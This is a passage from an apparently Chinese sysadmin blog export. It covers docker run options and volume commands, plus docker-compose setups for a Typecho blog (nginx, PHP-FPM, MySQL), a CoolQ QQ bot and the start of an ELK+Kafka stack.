run时，将所有输入输出指定到本地shell中，若执行时携带此参数，可以指定将stdin,stdout,stderr的某一个或某几个关联到本地shell3. --blkio-weight uint16 说明: 限制容器读写权重，当宿主机有1个以上容器时，可以设置容器的读写优先权，权重值在10～1000之间，0为关闭权重(默认) 4. --blkio-weight-device list 说明: 设置针对指定设备的权重，权重值在10～1000之间，且优先级高于blkio.weight 示例: --blkio-weight-device &quot;/dev/sda:100&quot; ubuntu:latest5. --cap-add list 说明:增强linux能力，在docker容器内限制了大部分的linux能力，在之前，需要开启这些功能需要结合--privileged开启特权模式才能使用这些参数，考虑到安全性，可以通过该参数来开启指定的linux功能【默认开启的功能及全部定义详见docker runc】，若参数为all则默认开启所有linux能力 6. --cap-drop list 说明: 移除linux能力 7. --cgroup-parent str 说明: 配置容器的控制组，继承该控制组的资源限制模式。 8. --cidfile str 说明: 创建一个容器，并将该容器的id输出到某一文件中，若该文件存在，则会返回一个错误 9. --cpu-period int 说明： 与参数--cpu-quota配合使用，用于设定cpu从新分配资源的时间周期,时间周期结束后，会对cpu进行重新分配 10. --cpu-quota int 说明:与参数--cpu-period配合使用，用于设定该容器在资源分配周期内占用cpu的时间，若容器设定--cpu-quota=1000000 --cpu-period=500000，则该容器在这个时间周期内权重为50%，这两个参数主要是提升宿主机内某一容器的权重比，可以用来解决宿主机内若干容器的资源抢占导致重要容器cpu性能不足的场景。该模式应用于Linux 的CFS模式11. --cpu-rt-period int 说明: --cpu-period的微秒版 12. --cpu-rt-runtime int 说明: 在一个cpu资源分配周期内，优先保证某容器的cpu使用的最大微秒数。例如，默认周期为 1000000 微秒（1秒），设置 --cpu-rt-runtime=950000 可确保使用实时调度程序的容器每 1000000 微秒可运行 950000 微秒，并保留至少 50000 微秒用于非实时任务 13. -c, --cpu-shares int 说明: CPU份额(相对权重),默认为0 14. --cpus decimal 说明: 设置容器使用cpu的数量 示例: --cpus=&quot;.5&quot; ubuntu:latest 15. --cpuset-cpus str 说明: 设置容器允许在哪个cpu上执行该进程，譬如--cpuset-cpus=&quot;1,3&quot;为指定在cpu 1 和cpu 3上执行，--cpuset-cpus=&quot;0-2&quot;为指定在cpu0,cpu1,cpu2上执行 示例: --cpuset-cpus=&quot;1,3&quot; 16. --cpuset-mems str 说明: 同参数--cpuset-cpus，但该参数是作用于NUMA 架构的 CPU 17. -d, --detach 说明: 后台运行容器并返回容器ID18. --detach-keys str 说明: 设置容器的键盘映射键位，在容器被链接到前台时，若宿主机的键盘键位与容器键位冲突，可以使用该指令对容器的键位进行重新映射 19. --device list 说明: 向容器中添加主机设备 20. --device-cgroup-rule list 说明: 将宿主机的设备添加到cgroup规则列表中 21. --device-read-bps list 说明: 限制设备的读取速率(每秒字节数)22. --device-read-iops list 说明: 限制设备的读取速率(每秒IO操作次数)23. --device-write-bps list 说明: 限制设备的写速率(每秒字节数)24. --device-write-iops list 说明: 限制设备的写速率(每秒IO操作次数)25. --disable-content-trust 说明: 忽略镜像的校验(默认为true) 26. --dns list 说明: 指定容器使用的DNS服务器,默认与主机一致27. --dns-option list 说明: 设置DNS选项，同修改/etc/resolv.conf文件28. --dns-search list 说明: 指定容器DNS搜索域名,默认与主机一致29. -entrypoint str 说明: 覆盖映像默认的entrypoint 30. -e, --env list 说明: 给容器设置环境变量31. --env-file list 说明: 从指定文件读取环境变量 32. --expose list 说明: 开放一个或多个端口33. --group-add list 说明: 为容器添加用户组 34. --health-cmd str 说明: 执行一个健康检查命令35. --health-interval duration 说明: 配合--health-cmd参数，设置健康检查的执行的间隔时间（ms /s / m / h）36. --health-retries int 说明: 配合--health-cmd参数，设置健康检查命令失败重试的次数37. --health-statr-period duration 说明: 配合--health-cmd参数，设置健康检查的启动时间（ms /s / m / h）38. --health-timout 说明: 配合--health-cmd参数，设置健康检查命令超时时间（ms /s / m / h） 39. -h, --hostname str 说明: 指定容器的hostname 示例: docker run --name consul -p 8500:8500 -h consul -d progrium/consul -server -bootstrap -h指定了容器的主机名为consul 40. --init 说明: 在容器中新增一个守护进程，来预防该容器出现僵尸进程的可能性 41. -i, --interactive 说明: 以交互模式运行容器,常与-t同时使用 42. --ip str 说明: 设置容器的IPv4地址43. --ip6 str 说明: 设置容器的IPv6地址 44. --ipc str 说明: 使用IPC模式45. --isolation str 说明: 使用容器隔离, 该参数拥有三个值&lt;br&gt;(1)default 即与使用dockerd --exec-opt的参数默认效果相同&lt;br&gt;(2)process 使用linux内核命名空间进行隔离，该参数不支持windows环境。&lt;br&gt;（3）使用微软的Hyper-V虚拟技术进行隔离，该参数仅限windows环境 46. --kernel-memory bytes 说明: 限制该容器内核的内存使用47. -l, --label list 说明: 设置该容器的元数据48. --label-file list 说明: 通过本地文件导入元数据至该容器 49. --link list --link &lt;name or id&gt;:alias 其中，name和id是源容器的name和id，alias是源容器在link下的别名。 说明: 指定容器间的关联，使用其他容器的IP、env等信息 示例: docker run -it --name mycentos4 --restart=always --link mycentos2:centos2 --link mycentos3:centos3 -d centos50. --link-local-ip list 说明: 容器IPv4/IPv6链路本地地址51. --log-driver str 说明: 设置日志工具，用于动态收集日志52. --log-opt list 说明: 配合参数--log-driver使用，用于日志配置 53. --mac-address str 说明: 设置该容器mac地址 54. -m, --memory byte 说明: 设置容器使用的最大内存55. --memory-reservation bytes 说明: 软限制该容器的内存使用，当宿主机内存空闲时，该容器的内存使用可以一定比例超出限制，但当宿主机内存紧张时，会强制该容器内存使用限制在该参数之内 56. --memory-swap bytes 说明: 内存交换分区大小限制。配合参数--memory使用，且最小内存交换限制应该大于内存限制。该参数有4种情况:&lt;br&gt; (1)不设置--memory与该参数:则该容器默认可以用完宿舍机的所有内存和 宿主机 swap 分区。&lt;br&gt; (2)设置--memory 50MB 不设置--memory-swap（默认为0）:则--memory-swap值等于限制内存大小，即该容器能够申请的最大内存为100MB。&lt;br&gt; (3)设置--memory 50MB --memory-swap为-1:则该容器最大可以申请的内存为50MB+宿主机swap分区大小 &lt;br&gt; (4)设置--memory 50MB --memory-swap 100MB:则该容器可以申请的最大内存为100MB-50MB=50MB 57. --memory-swappiness int 说明: 用于调整虚拟内存的控制行为，为0～100之间的整数。在linux内存管理中，将内存中不活跃的页交换至硬盘中，以缓解内存紧张，该参数设置为0则认定该容器所有内存中的内容均不允许交换至硬盘，用以保障最大性能，若设置为100，则认为该容器所有内存中的数据均可以交换至硬盘。 58. --mount mount 说明: 将文件系统挂载到容器59. --name str 说明: 为容器指定一个名称 60. --network str 说明: 将容器连接到网络，支持bridge/host/none/container四种类型61. --network-alias list 说明: 设置该容器在网络上的别名62. --no-healthcheck 说明: 禁止一切健康检查行为63. --oom-kill-disable 说明: 设置是否禁止oom kill行为，若该容器因为需要大量请求内存，导致宿主机内存不足或触发到内存限制，导致杀死该容器进程，若设置该参数为true则会关闭这个检查 64. --oom-score-adj int 说明: 调整主机的OOM首选项（从-1000到1000）此处需要注意的是，非专业人士docker官方是不建议用户修改--oom-score-adj--oom-kill-disable这两个参数的 65. --pid string 说明: 设置该容器的pid66. --pids-limit int 说明: 限制该容器所能创建的最大进程数。默认-1不限制 67. --privileged 说明: 在该容器上开启特权模式，让该容器拥有所有的linux能力 68. -p, --publish list 说明: 将容器的端口映射到宿主机上 示例: docker run -p 8000:8000 ubuntu 69. --publish-all 说明: 将该容器的所有端口均随机映射至宿主机70. --read-only 说明: 设置该容器只读71. --restart str 说明: 在退出该容器时重启该容器,默认为no 其他: --restart=always 重启Docker时，容器自动启动。 可以后期添加：docker container update --restart=always 容器名 72. --rm 说明: 当容器退出时自动删除它 73. --runtime str 说明: 指定该容器关联一个runtime的容器，在使用该参数时注意runtime specified必须在dockerd --add-runtime注册过 74. --security-opt list 说明: 设置安全属性，在windows上使用CredentialSpec模块来执行身份识别75. --shm-size bytes 说明: 设置/dev/shm/目录的大小 76. --sig-proxy 说明: 代理进程所接收的所有字符,当指定--sig-proxy=false时，ctrl+c和ctrl+d 不会传递信号给docker进程而关闭容器,默认为true 77. --stop-signal str 说明: 停止带有信号的容器，在linux环境下输入kill -l,就可以看到所有信号名称，可以指定容器发出某种信号时停止该容器，譬如SIGKILL,默认为SIGTERM 78. --stop-timeout int 说明: 设置容器调用命令超时后自动退出。该参数可以设置容器在调用命令时导致超时后多少秒退出，0(默认)为永远不退出，该参数单位为秒 79. --storage-opt list 说明: 容器的存储设置,可以分别指定dm.basesize、dm.loopdatasize、dm.loopmetadatasize等项 示例: --storage-opt dm.basesize=20G 80. --sysctl map 说明: 内核参数，对应修改容器中的/etc/sysctl.conf文件81. --tmpfs list 说明: 指定挂载一个tmpfs目录，tmpfs是一种虚拟内存文件系统。 82. -t, -tty 说明: 打开一个伪终端,常与-i同时使用83. --ulimit ulimit 说明: 设置容器的ulimit选项 84. -u, --user str 说明: 用户名或UID 85. --userns str 说明:86. --uts str 说明: 使用uts命名空间 87. -v, --volume list 说明: 在该容器下挂载卷 先在本地mkdir /my/own/datadir 目录 示例: docker run --name some-mysql -v /my/own/datadir:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql 88. --volume-driver str 说明: 容器的可选卷驱动程序 89. --volumes-from list 说明: 从指定容器装入卷 90. -w, --workdir str 说明: 指定容器的工作目录 4.10 docker create [optoins] image [command] [arg...] // 创建一个新容器参数 同run 5. 镜像管理5.1 docker images [options] [repository[:tag]] //列出镜像 选项 说明 示例 -a --all 列出所有镜像 --digests 显示摘要信息(sha256) -f --filter filter 过滤 --format str `` --no-trunc `` -q --quiet 仅显示ID 5.2 docker rmi [options] image...//删除镜像 选项 说明 示例 -f --force 强制删除 --no-prune `` 5.4 docker tag src_image[:tag] tar_image[:tag] // 创建某个镜像的副本 示列： docker image tag openspug/spug:latest openspug/spug:v1 5.5 docker history [options] image //查看指定镜像的创建历史。 选项 说明 示例 --format str 使用Go模板打印漂亮的图像 -H --human 以可读的形式打印日志和大小 --no-trunc 不截断输出 -q --quiet 仅显示数字标识 5.6 docker save [options] image... //将指定镜像保存为tar归档文件 选项 说明 示例 -o --output str 输出至指定的文件 5.6 docker import [options] file/url/- [repository[:tag]] //由tar文档生成镜像 选项 说明 示例 -c , --change list 用dockerfile指令创建镜像 -m, --message str 为创建的镜像设置描述信息 5.7 docker build [options] path / url / - //使用dockerfile创建镜像 选项 说明 示例 --add-host list `` --build-arg list 设置镜像创建时的变量 --cache-from str `` --cgroup-parent str `` --compress 使用zip压缩构建上下文 --cpu-period int 限制 CPU CFS周期 --cpu-quota int 限制 CPU CFS配额 -c --cpu-shars int 设置 cpu 使用权重 --cpuset-cpus str 指定使用的CPU id --cpuset-mems str 指定使用的内存 id --disable-content-trust 忽略校验，默认开启 -f --file str 指定要使用的Dockerfile路径 --force-rm 设置镜像过程中删除中间容器 --iidfile str 指定保存镜像id的文件 --isolation str 使用容器隔离技术 --label list 设置镜像使用的元数据 -m --memory bytes 设置内存最大值 --memory-swap bytes 设置Swap的最大值为内存+swap，&quot;-1&quot;表示不限swap --network str 设置镜像网络模式 --no-cache 创建镜像的过程不使用缓存 --pull 尝试去更新镜像的新版本 -q, --quiet 只输出镜像ID --rm 设置镜像成功后删除中间容器 --security-opt str 安全设置 --shm-size bytes 设置/dev/shm的大小，默认值是64M -t, --tag list 指定要创建的目标镜像名 --target str 设置要生成的目标生成阶段 --ulimit ulimit Ulimit配置 6，volume卷管理docker volume 可以理解成一个container中的磁盘,既可以跟随container的生命周期（在Dockerfile 中定义使用VOLUME关键字），也可以单独创建，永久存储，直到用docker volume rm 命令删除。 1.查看volume 1docker volume ls 2.创建volume 123456789docker volume create [options] 卷名 options选项有两个参数 -d 指定存储设备，默认是local -o 直接卷的存储路径 默认是 map[]示例1: docker volume create -d local-persist -o mountpoint=/data/images --name=myvoluem示例2: 参数默认 docker volume create vo_logs 这时候卷的存放路径是/var/lib/docker/volumes/vo_logs/_data 3.查看volume的详细信息 1docker volume inspect vo_logs 4.删除卷 1234567docker volume rm -f vo_logs -f 表示强制删除 docker volume prune [options]删除未被任何容器使用的本地卷 --filter 提供过滤值-f , --force 不提示确认信息，直接删除 5.卷的使用 1234567docker run -t --name mysql --restart=always -p 3306:3306 -v myvoluem:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=mypassword -d mysql这时候容器里的/var/lib/mysql的数据就存在myvoluem这个数据卷里了，第二种是本地挂载绑定宿主目录的概念很容易理解，就是将宿主目录绑定到容器中的某个目录位置。这样容器可以直接访问宿主目录的文件。其形式是docker run --name some-mysql -v /my/own/datadir:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql 6.卷和挂载目录有什么区别？ 卷 (Docker Volume) 是受控存储，是由 Docker 引擎进行管理维护的。因此使用卷，你可以不必处理 uid、SELinux 等各种权限问题，Docker 引擎在建立卷时会自动添加安全规则，以及根据挂载点调整权限。并且可以统一列表、添加、删除。另外，除了本地卷外，还支持网络卷、分布式卷。 而挂载目录那就没人管了，属于用户自行维护。你就必须手动处理所有权限问题。特别是在 CentOS 上，很多人碰到 Permission Denied，就是因为没有使用卷，而是挂载目录，而且还对 SELinux 安全权限一无所知导致。 7. 其他命令7.1 docker info //显示docker系统信息 7.2 docker version 或者docker -v // 显示docker相关的版本信息","link":"/2020/08/04/docker_%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"},{"title":"docker-compose一键部署typecho","text":"docker-compose一键部署typecho docker volume 持久化插件12345678910111213vim /etc/systemd/system/docker-volume-local-persist.service#文件内容为[Unit]Description=docker-volume-local-persistBefore=docker.serviceWants=docker.service[Service]TimeoutStartSec=0ExecStart=/usr/bin/docker-volume-local-persist[Install]WantedBy=multi-user.target 12345wget https://github.com/MatchbookLab/local-persist/releases/download/v1.3.0/local-persist-linux-amd64 chmod +x local-persist-linux-amd64 &amp;&amp; mv local-persist-linux-amd64 docker-volume-local-persist &amp;&amp; mv docker-volume-local-persist /usr/bin/systemctl daemon-reload &amp;&amp; systemctl enable docker-volume-local-persist &amp;&amp; systemctl start docker-volume-local-persist 安装docker12345678910yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum install -y docker-ce docker-ce-cli containerd.iosystemctl restart docker &amp;&amp; systemctl enable docker一、安装bash-completeyum install -y bash-completion二、刷新文件source /usr/share/bash-completion/completions/docker &amp;&amp; source /usr/share/bash-completion/bash_completion 安装docker-compose方法一： curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose 或者： curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose ​​ chmod +x /usr/local/bin/docker-compose​ 查看版本信息​ # docker-compose –version ​​ 方法二：​ yum install -y epel-release yum -y install python-pip python-devel pip install docker-compose 如果报以下错误， 就直接安装这个就可以了 1pip install six --user -U 前提:已安装docker，域名已解析，已配置https,如没有域名 调整相关配置 支持端口转发 12echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf sysctl -p 1mkdir /data/{app,back,typecho} -p &amp;&amp; cd /data/typecho 编写Dockerfile1234567vim DockerfileFROM php:7.2.3-fpmRUN apt-get updateRUN docker-php-ext-install pdo_mysql 保存Dockerfile 在typecho目录构建镜像 1docker build -t scofieldpeng/php:7.2.3-fpm . 创建docker编排文件 12cd /data/app/touch docker-compose.yml mysql文件夹，用来存放mysql数据，方便后期导出 1mkdir mysql mysql镜像的环境 1touch mysql.env nginx配置文件 1touch typecho.conf 克隆官方仓库 1git clone https://github.com/typecho/typecho.git mysql.env中的内容 1234567891011#MySQL的root用户默认密码，这里自行更改MYSQL_ROOT_PASSWORD=Mysqlpass#MySQL镜像创建时自动创建的数据库名称MYSQL_DATABASE=typecho#MySQL镜像创建时自动创建的用户名MYSQL_USER=typecho#MySQL镜像创建时自动创建的用户密码MYSQL_PASSWORD=Mysqlpass typecho.conf的内容为 按需求修改相关内容，ssl可以注释掉 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990server { listen 0.0.0.0:80; root /app; index index.php; server_name www.baidu.com baidu.com; rewrite ^ https://$server_name$request_uri? permanent; charset utf-8; access_log /var/log/nginx/typecho_access.log main; if (-f $request_filename/index.html){ rewrite (.*) $1/index.html break; } if (-f $request_filename/index.php){ rewrite (.*) $1/index.php; } if (!-f $request_filename){ rewrite (.*) /index.php; } location ~ .*\\.php(\\/.*)*$ { ##try_files $uri = 404; include fastcgi_params; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_index index.php; fastcgi_pass php-fpm:9000; }}server { listen 443 ssl; root /app; index index.php; server_name www.baidu.com baidu.com; ssl_certificate /etc/letsencrypt/live/www.baidu.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/www.baidu.com/privkey.pem; ssl_session_timeout 1d; ssl_session_cache shared:SSL:50m; ssl_session_tickets on; ssl_dhparam /etc/ssl/private/dhparam.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128:AES256:AES:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK'; ssl_prefer_server_ciphers on; access_log /var/log/nginx/typecho_access.log main; if (-f $request_filename/index.html){ rewrite (.*) $1/index.html break; } if (-f $request_filename/index.php){ rewrite (.*) $1/index.php; } if (!-f $request_filename){ rewrite (.*) /index.php; } location ~ .*\\.php(\\/.*)*$ { ##try_files $uri = 404; include fastcgi_params; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_index index.php; fastcgi_pass php-fpm:9000; }} docker-compose.yml中内容1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950version: '2'services: nginx: image: nginx:1.13.9-alpine container_name: app_nginx ports: - &quot;80:80&quot; - &quot;443:443&quot; restart: always volumes: - ./typecho:/app - ./typecho.conf:/etc/nginx/conf.d/default.conf - logs:/var/log/nginx - /etc/ssl:/etc/ssl - /etc/letsencrypt:/etc/letsencrypt links: - php-fpm depends_on: - php-fpm php-fpm: image: scofieldpeng/php:7.2.3-fpm restart: always container_name: app_php-fpm volumes: - ./typecho:/app links: - db depends_on: - db db: image: mysql:5.7.21 restart: always container_name: app_db ports: - 7878:3306 volumes: - mysqldb:/var/lib/mysql - logs:/var/logs/mysql - /etc/mysql/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf env_file: - mysql.envvolumes: logs: driver: local-persist driver_opts: mountpoint: /data/back/ mysqldb: driver: local-persist driver_opts: mountpoint: /data/app/mysql 12mkdir /etc/mysql vim /etc/mysql/mysqld.cnf 我的mysqld.cnf 12345678910[mysqld]pid-file = /var/run/mysqld/mysqld.pidsocket = /var/run/mysqld/mysqld.sockdatadir = /var/lib/mysql#log-error = /var/log/mysql/error.log# By default we only accept connections from localhost#bind-address = 127.0.0.1# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0max_allowed_packet=400M 然后运行 1docker-compose up -d 开通对应的防火墙端口 12iptables -A INPUT -p tcp -m multiport --dports 80,443,7878 -j ACCEPTiptables -A INPUT -p tcp -m multiport --sports 80,443,7878 -j ACCEPT docker inspect app_db 查看数据库的ip地址 开始访问,做初始化配置1http://192.168.224.12 这时候会提示手动创建config.inc.php文件。 然后进入typecho目录 vim config.inc.php 文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php/** * Typecho Blog Platform * * @copyright Copyright (c) 2008 Typecho team (http://www.typecho.org) * @license GNU General Public License 2.0 * @version $Id$ *//** 定义根目录 */define('__TYPECHO_ROOT_DIR__', dirname(__FILE__));/** 定义插件目录(相对路径) */define('__TYPECHO_PLUGIN_DIR__', '/usr/plugins');/** 定义模板目录(相对路径) */define('__TYPECHO_THEME_DIR__', '/usr/themes');/** 后台路径(相对路径) */define('__TYPECHO_ADMIN_DIR__', '/admin/');/** 设置包含路径 */@set_include_path(get_include_path() . PATH_SEPARATOR .__TYPECHO_ROOT_DIR__ . '/var' . PATH_SEPARATOR .__TYPECHO_ROOT_DIR__ . __TYPECHO_PLUGIN_DIR__);/** 载入API支持 */require_once 'Typecho/Common.php';/** 程序初始化 */Typecho_Common::init();/** 定义数据库参数 */$db = new Typecho_Db('Pdo_Mysql', 'typecho_');$db-&gt;addServer(array ( 'host' =&gt; '172.20.0.2', 'user' =&gt; 'root', 'password' =&gt; 'Mysqlpass', 'charset' =&gt; 'utf8', 'port' =&gt; '3306', 'database' =&gt; 'typecho', 'engine' =&gt; 'InnoDB',), Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db); 然后回到网页上开始安装 最后Typecho 安装好后，默认的后台路径是”你的域名/admin“，为了提高安全性，把访问路径设置为“你的域名/自定义文件夹”。网站根目录下的config.inc.php文件里，找到： 后台路径(相对路径) define(‘TYPECHO_ADMIN_DIR‘, ‘/admin/‘); 把这个/admin/路径改成自己想要的路径就行了，同时把网站中的admin文件夹改成相同的名字。重新建立个admin文件夹，建立index.html文件，里面可以随意写嘲讽内容。","link":"/2020/08/05/docker-compose%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2typecho/"},{"title":"docke一键安装酷Q搭建个人QQ机器人","text":"docker一键安装酷Q搭建个人QQ机器人一，通过docker 运行容器 先下载coolq镜像 123docker pull coolq/wine-coolqmkdir /data/coolq/coolq-data/ -p 创建一个nginx.conf文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394vim /data/coolq/coolq-data/nginx.conf user user user;worker_processes 1; pid /var/run/nginx.pid; events { worker_connections 768; multi_accept on; } http { sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; set_real_ip_from 10.0.0.0/8; set_real_ip_from 100.64.0.0/10; set_real_ip_from 169.254.0.0/16; set_real_ip_from 172.16.0.0/12; set_real_ip_from 192.168.0.0/16; real_ip_header X-Forwarded-For; real_ip_recursive off; server_names_hash_bucket_size 64; server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; access_log /dev/stdout; error_log /dev/stderr; gzip on; gzip_disable &quot;msie6&quot;; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_http_version 1.1; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; map $http_x_forwarded_proto $upstream_https { default &quot;$https&quot;; &quot;https&quot; &quot;on&quot;; &quot;http&quot; &quot;&quot;; } map $http_x_forwarded_proto $upstream_scheme { default &quot;$scheme&quot;; &quot;https&quot; &quot;https&quot;; &quot;http&quot; &quot;http&quot;; } map $http_x_forwarded_host $upstream_server_name { &quot;&quot; &quot;$server_name&quot;; default &quot;$http_x_forwarded_host&quot;; } server { listen 9000 default_server; root /app/src/novnc; index index.html index.htm; server_name _; location / { index vnc.html index.html index.htm; } location /websockify { proxy_connect_timeout 7d; proxy_send_timeout 7d; proxy_read_timeout 7d; proxy_http_version 1.1; proxy_pass http://localhost:9001/; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; } location ~ /\\. { deny all; } } } 运行容器 1docker run --name=coolq -it -d --restart=always -p 88:9000 -v /data/cooclq/coolq-data:/home/user/coolq -v /data/coolq/coolq-data/nginx.conf:/etc/nginx/nginx.conf -e VNC_PASSWD=&quot;123456&quot; -e COOLQ_ACCOUNT=&quot;1234567&quot; coolq/wine-coolq 输入IP加88端口访问:密码就输入123456 然后登陆小号QQ进行测试 二，通过docker-compose.yml一键启动1mkdir /data/coolq/coolq-data/ -p &amp;&amp; cd /data/coolq/ &amp;&amp; mkdir ./ssl/certs/wohenliu.com/ -p 把上面的nginx.conf文件拷贝到/data/coolq/目录下 编辑 vim docker-compose.yml 文件 123456789101112131415161718vim docker-compose.ymlversion: '2'services: coolq: image: coolq/wine-coolq container_name: coolq ports: - &quot;82:9000&quot; - &quot;83:443&quot; restart: always volumes: - ./coolq-data:/home/user/coolq - ./nginx.conf:/etc/nginx/nginx.conf - ./ssl:/etc/ssl environment: VNC_PASSWD: &quot;123456&quot; COOLQ_ACCOUNT: &quot;123456&quot; 然后执行命令 1docker-compose up -d 最后配置域名ssl访问，编辑nginx.conf文件 123456789101112131415161718192021222324增加server { listen 443 ssl; root /app/src/novnc; index index.html index.htm; server_name www.wohenliu.com wohenliu.com;ssl_certificate /etc/ssl/certs/wohenliu.com/wohenliu.com.nginx.crt; ssl_certificate_key /etc/ssl/certs/wohenliu.com/wohenliu.com.key; location / { index vnc.html index.html index.htm; } location /websockify { proxy_connect_timeout 7d; proxy_send_timeout 7d; proxy_read_timeout 7d; proxy_http_version 1.1; proxy_pass http://localhost:9001/; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; } 改好了后就重启容器 然后登陆小号QQ进行测试","link":"/2020/08/04/docker%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E9%85%B7Q%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BAQQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"},{"title":"docker-compose安装elk+kafka","text":"docker volume 持久化插件 12345678910111213vim /etc/systemd/system/docker-volume-local-persist.service#文件内容为[Unit]Description=docker-volume-local-persistBefore=docker.serviceWants=docker.service[Service]TimeoutStartSec=0ExecStart=/usr/bin/docker-volume-local-persist[Install]WantedBy=multi-user.target 12345wget https://github.com/MatchbookLab/local-persist/releases/download/v1.3.0/local-persist-linux-amd64 chmod +x local-persist-linux-amd64 &amp;&amp; mv local-persist-linux-amd64 docker-volume-local-persist &amp;&amp; mv docker-volume-local-persist /usr/bin/systemctl daemon-reload &amp;&amp; systemctl enable docker-volume-local-persist &amp;&amp; systemctl start docker-volume-local-persist 安装docker 12345678910yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum install -y docker-ce docker-ce-cli containerd.iosystemctl restart docker &amp;&amp; systemctl enable docker一、安装bash-completeyum install -y bash-completion二、刷新文件source /usr/share/bash-completion/completions/docker &amp;&amp; source /usr/share/bash-completion/bash_completion /etc/sysctl.conf 添加net.ipv4.ip_forward = 1vm.max_map_count=262144 123sysctl -p --systemyum -y remove firewall* &amp;&amp; yum -y install lrzsz iptables* epel-release python-pip &amp;&amp; pip install docker-compose &amp;&amp; systemctl enable iptables 12mkdir -p /elk/logstashvim logstash-kafka.conf logstash-kafka.conf 文件内容为 12345678910111213141516171819202122232425262728293031323334input {# # 来源beats# beats { # 端口# port =&gt; &quot;5044&quot;# } kafka { bootstrap_servers =&gt; &quot;kafka1:9092&quot; topics =&gt; [&quot;all_logs&quot;] group_id =&gt; &quot;logstash&quot; codec =&gt; json }}# 分析、过滤插件，可以多个filter {# grok {# match =&gt; { &quot;message&quot; =&gt; &quot;%{COMBINEDAPACHELOG}&quot;}# }# geoip {# source =&gt; &quot;clientip&quot;# }}output { # 选择elasticsearch elasticsearch { hosts =&gt; [&quot;http://elasticsearch:9200&quot;] #index =&gt; &quot;%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}&quot; index =&gt; &quot;all-logs-%{+YYYY.MM.dd}&quot; user =&gt; &quot;elastic&quot; password =&gt; &quot;secret&quot; }} 1mv logstash-kafka.conf /elk/logstash docker-compose.yml文件内容为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121version: '3'services: elasticsearch: restart: always container_name: elasticsearch image: docker.elastic.co/elasticsearch/elasticsearch:7.4.2 environment: - discovery.type=single-node ports: - &quot;9200:9200&quot; - &quot;9300:9300&quot; volumes: - elasticsearch:/usr/share/elasticsearch/data:rw - /etc/localtime:/etc/localtime networks: - elastic kibana: image: docker.elastic.co/kibana/kibana:7.4.2 restart: always container_name: kibana volumes: - kibana:/usr/share/kibana/config:rw - /etc/localtime:/etc/localtime depends_on: - elasticsearch ports: - &quot;5601:5601&quot; environment: SERVER_NAME: kibana.example.org ELASTICSEARCH_HOSTS: http://elasticsearch:9200 networks: - elastic logstash: image: docker.elastic.co/logstash/logstash:7.4.2 container_name: logstach command: logstash -f /usr/share/logstash/conf/logstash-kafka.conf restart: always tty: true ports: - &quot;5044:5044&quot; volumes: - 